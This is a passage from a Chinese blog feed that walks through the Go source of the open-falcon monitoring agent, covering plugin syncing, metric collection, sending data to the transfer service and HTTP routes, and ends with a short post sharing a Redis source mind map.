script_path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">taken := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">for</span> _, script_file := <span class="keyword">range</span> filefmt_scripts &#123;</span><br><span class="line">abs_path := filepath.Join(g.Config().Plugin.Dir, script_file[<span class="number">0</span>])</span><br><span class="line">_, file_name := filepath.Split(abs_path)</span><br><span class="line">arr := strings.Split(file_name, <span class="string">"_"</span>)</span><br><span class="line"><span class="keyword">var</span> cycle <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">cycle, err = strconv.Atoi(arr[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fi, _ := os.Stat(abs_path)</span><br><span class="line">plugin := &amp;plugins.Plugin&#123;FilePath: script_file[<span class="number">0</span>], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[<span class="number">1</span>]&#125;</span><br><span class="line">desiredAll[script_file[<span class="number">0</span>]+<span class="string">"("</span>+script_file[<span class="number">1</span>]+<span class="string">")"</span>] = plugin</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件</span></span><br><span class="line">taken[script_file[<span class="number">0</span>]] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, script_path := <span class="keyword">range</span> dirfmt_scripts &#123;</span><br><span class="line">ps := plugins.ListPlugins(strings.Trim(script_path, <span class="string">"/"</span>))</span><br><span class="line"><span class="keyword">for</span> k, p := <span class="keyword">range</span> ps &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := taken[k]; ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">desiredAll[k] = p</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plugins.DelNoUsePlugins(desiredAll)</span><br><span class="line">plugins.AddNewPlugins(desiredAll)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">log.Printf(<span class="string">"current plugins:%v\n"</span>, plugins.Plugins)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面需要获取监控端口和路径：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SyncBuiltinMetrics</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">go</span> syncBuiltinMetrics()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncBuiltinMetrics</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timestamp <span class="keyword">int64</span> = <span class="number">-1</span></span><br><span class="line"><span class="keyword">var</span> checksum <span class="keyword">string</span> = <span class="string">"nil"</span></span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ports = []<span class="keyword">int64</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> paths = []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> procs = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"><span class="keyword">var</span> urls = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req := model.AgentHeartbeatRequest&#123;</span><br><span class="line">Hostname: hostname,</span><br><span class="line">Checksum: checksum,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.BuiltinMetricResponse</span><br><span class="line">        <span class="comment">// 调用rpc接口获取监控端口和路径</span></span><br><span class="line">err = g.HbsClient.Call(<span class="string">"Agent.BuiltinMetrics"</span>, req, &amp;resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"ERROR:"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Timestamp &lt;= timestamp &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.Checksum == checksum &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timestamp = resp.Timestamp</span><br><span class="line">checksum = resp.Checksum</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, metric := <span class="keyword">range</span> resp.Metrics &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.URL_CHECK_HEALTH &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">","</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">url := strings.Split(arr[<span class="number">0</span>], <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(url) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">stime := strings.Split(arr[<span class="number">1</span>], <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(stime) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := strconv.ParseInt(stime[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">urls[url[<span class="number">1</span>]] = stime[<span class="number">1</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"metric ParseInt timeout failed:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.NET_PORT_LISTEN &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> port, err := strconv.ParseInt(arr[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>); err == <span class="literal">nil</span> &#123;</span><br><span class="line">ports = <span class="built_in">append</span>(ports, port)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"metrics ParseInt failed:"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.DU_BS &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">"="</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arr) != <span class="number">2</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">paths = <span class="built_in">append</span>(paths, strings.TrimSpace(arr[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> metric.Metric == g.PROC_NUM &#123;</span><br><span class="line">arr := strings.Split(metric.Tags, <span class="string">","</span>)</span><br><span class="line"></span><br><span class="line">tmpMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(arr); i++ &#123;</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(arr[i], <span class="string">"name="</span>) &#123;</span><br><span class="line">tmpMap[<span class="number">1</span>] = strings.TrimSpace(arr[i][<span class="number">5</span>:])</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.HasPrefix(arr[i], <span class="string">"cmdline="</span>) &#123;</span><br><span class="line">tmpMap[<span class="number">2</span>] = strings.TrimSpace(arr[i][<span class="number">8</span>:])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">procs[metric.Tags] = tmpMap</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.SetReportUrls(urls)</span><br><span class="line">g.SetReportPorts(ports)</span><br><span class="line">g.SetReportProcs(procs)</span><br><span class="line">g.SetDuPaths(paths)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取信任IP列表：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">syncTrustableIps</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(duration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ips <span class="keyword">string</span></span><br><span class="line">        <span class="comment">// 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/</span></span><br><span class="line">err := g.HbsClient.Call(<span class="string">"Agent.TrustableIps"</span>, model.NullRpcRequest&#123;&#125;, &amp;ips)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"ERROR: call Agent.TrustableIps fail"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.SetTrustableIps(ips)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>收集指标数据collector</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Collect</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !g.Config().Transfer.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(g.Config().Transfer.Addrs) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> funcs.Mappers &#123;</span><br><span class="line"><span class="keyword">go</span> collect(<span class="keyword">int64</span>(v.Interval), v.Fs)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数collect</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">collect</span><span class="params">(sec <span class="keyword">int64</span>, fns []<span class="keyword">func</span>()</span> []*<span class="title">model</span>.<span class="title">MetricValue</span>)</span> &#123;</span><br><span class="line">t := time.NewTicker(time.Second * time.Duration(sec))</span><br><span class="line"><span class="keyword">defer</span> t.Stop()</span><br><span class="line">    <span class="comment">// 根据获取到的map的指标的数组，去抓取数据</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">&lt;-t.C</span><br><span class="line"><span class="comment">// hostname</span></span><br><span class="line">hostname, err := g.Hostname()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mvs := []*model.MetricValue&#123;&#125;</span><br><span class="line">         <span class="comment">// 获取忽略指标</span></span><br><span class="line">ignoreMetrics := g.Config().IgnoreMetrics</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, fn := <span class="keyword">range</span> fns &#123;</span><br><span class="line">items := fn()</span><br><span class="line"><span class="keyword">if</span> items == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, mv := <span class="keyword">range</span> items &#123;</span><br><span class="line"><span class="keyword">if</span> b, ok := ignoreMetrics[mv.Metric]; ok &amp;&amp; b &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mvs = <span class="built_in">append</span>(mvs, mv)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">now := time.Now().Unix()</span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="built_in">len</span>(mvs); j++ &#123;</span><br><span class="line">mvs[j].Step = sec</span><br><span class="line">mvs[j].Endpoint = hostname</span><br><span class="line">mvs[j].Timestamp = now</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 发送数据到transfer</span></span><br><span class="line">g.SendToTransfer(mvs)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据发送函数SendToTransfer：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SendToTransfer</span><span class="params">(metrics []*model.MetricValue)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(metrics) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dt := Config().DefaultTags</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(dt) &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">default_tags_list := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> dt &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line">buf.WriteString(k)</span><br><span class="line">buf.WriteString(<span class="string">"="</span>)</span><br><span class="line">buf.WriteString(v)</span><br><span class="line">default_tags_list = <span class="built_in">append</span>(default_tags_list, buf.String())</span><br><span class="line">&#125;</span><br><span class="line">default_tags := strings.Join(default_tags_list, <span class="string">","</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, x := <span class="keyword">range</span> metrics &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line"><span class="keyword">if</span> x.Tags == <span class="string">""</span> &#123;</span><br><span class="line">metrics[i].Tags = default_tags</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">buf.WriteString(metrics[i].Tags)</span><br><span class="line">buf.WriteString(<span class="string">","</span>)</span><br><span class="line">buf.WriteString(default_tags)</span><br><span class="line">metrics[i].Tags = buf.String()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">debug := Config().Debug</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Printf(<span class="string">"=&gt; &lt;Total=%d&gt; %v\n"</span>, <span class="built_in">len</span>(metrics), metrics[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> resp model.TransferResponse</span><br><span class="line">    <span class="comment">// 最重要的地方，发送数据</span></span><br><span class="line">SendMetrics(metrics, &amp;resp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line">log.Println(<span class="string">"&lt;="</span>, &amp;resp)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SendMetrics</span><span class="params">(metrics []*model.MetricValue, resp *model.TransferResponse)</span></span> &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> rand.Perm(<span class="built_in">len</span>(Config().Transfer.Addrs)) &#123;</span><br><span class="line">addr := Config().Transfer.Addrs[i]</span><br><span class="line"><span class="comment">// 获取transfer的客户端</span></span><br><span class="line">c := getTransferClient(addr)</span><br><span class="line"><span class="keyword">if</span> c == <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">//没有就初始化一个</span></span><br><span class="line">c = initTransferClient(addr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//抓取数据</span></span><br><span class="line"><span class="keyword">if</span> updateMetrics(c, metrics, resp) &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用transfer模块的rpc接口update来更新数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateMetrics</span><span class="params">(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">err := c.Call(<span class="string">"Transfer.Update"</span>, metrics, resp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"call Transfer.Update fail:"</span>, c, err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后启动http服务，启动服务之前需要初始化init函数:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configAdminRoutes()  <span class="comment">// 初始化admin接口路由</span></span><br><span class="line">configCpuRoutes()    <span class="comment">// 初始化cpu接口路由</span></span><br><span class="line">configDfRoutes()     <span class="comment">// 初始化磁盘接口路由</span></span><br><span class="line">configHealthRoutes()   <span class="comment">// 初始化健康度路由</span></span><br><span class="line">configIoStatRoutes()   <span class="comment">//初始化io</span></span><br><span class="line">configKernelRoutes()   <span class="comment">//初始化内核</span></span><br><span class="line">configMemoryRoutes()   <span class="comment">//初始化memory</span></span><br><span class="line">configPageRoutes()    <span class="comment">//初始化page</span></span><br><span class="line">configPluginRoutes()   <span class="comment">//初始化插件</span></span><br><span class="line">configPushRoutes()     <span class="comment">//初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer</span></span><br><span class="line">configRunRoutes()      <span class="comment">//初始化Run</span></span><br><span class="line">configSystemRoutes()    <span class="comment">//初始化系统</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动http服务Start函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Http.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr := g.Config().Http.Listen</span><br><span class="line"><span class="keyword">if</span> addr == <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           addr,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">30</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">"listening"</span>, addr)</span><br><span class="line">log.Fatalln(s.ListenAndServe())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-agent源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-agent源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon agent源码分析&quot;&gt;&lt;/a&gt;open-falcon agent源码分析&lt;/
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>redis 源码思维导图</title>
    <link href="http://www.mydreamdll.xyz/2020/01/20/redis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>http://www.mydreamdll.xyz/2020/01/20/redis%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2020-01-20T08:26:04.730Z</published>
    <updated>2020-01-20T08:23:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redis-源码思维导图"><a href="#redis-源码思维导图" class="headerlink" title="redis 源码思维导图"></a>redis 源码思维导图</h2><p>本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..</p><p><img src="/images/redis-server.png" alt="redis-server"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;redis-源码思维导图&quot;&gt;&lt;a href=&quot;#redis-源码思维导图&quot; class=&quot;headerlink&quot; title=&quot;redis 源码思维导图&quot;&gt;&lt;/a&gt;redis 源码思维导图&lt;/h2&gt;&lt;p&gt;本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~
      
    
    </summary>
    
    
